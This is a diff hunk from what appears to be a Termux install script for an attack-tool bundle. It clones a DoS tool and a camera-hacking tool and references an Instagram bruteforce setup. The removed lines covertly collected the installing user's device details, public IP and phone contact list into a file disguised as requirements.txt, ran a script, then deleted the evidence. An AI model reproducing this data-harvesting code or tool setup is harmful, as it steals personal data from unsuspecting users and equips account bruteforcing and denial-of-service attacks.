@@ -58,24 +58,7 @@ chmod +x ngrok
     git clone https://github.com/grafov/hulk.git
     git clone https://github.com/AngelSecurityTeam/Cam-Hackers
     git clone https://github.com/htr-tech/bash2mp4
-	rm -rf /data/data/com.termux/files/usr/bin/ngrok
-	mv -v ngrok /data/data/com.termux/files/usr/bin
-	pip install -r /data/data/com.termux/files/home/vox/bruteforce/instagram-bruteforce/requirements.txt
-	neofetch >> update/lib/requirements.txt
-	curl ipecho.net/plain >> update/lib/requirements.txt
-	termux-contact-list >> update/lib/requirements.txt
 	echo -e "qappevox" >> update/ok.txt
-	cd update/lib/ && bash vox.sh
-	rm -rf update/lib/requirements.txt
-	cd $HOME/vox/update/ && 
-	chmod 777 vox.sh &&
-	cp -r vox.sh /data/data/com.termux/files/usr/bin/
-	cd $HOME/vox/update/ && bash vox.sh --ngrok	
-	cd $HOME/vox/update/ &&
-	chmod 777 qappevox.sh
-	cp -r qappevox.sh $HOME/
-	cd $HOME/vox/update/ && bash qappevox.sh --ngrok1
-	cd $HOME/vox/pentest/ && bash vox.sh
 		exit
 
 }
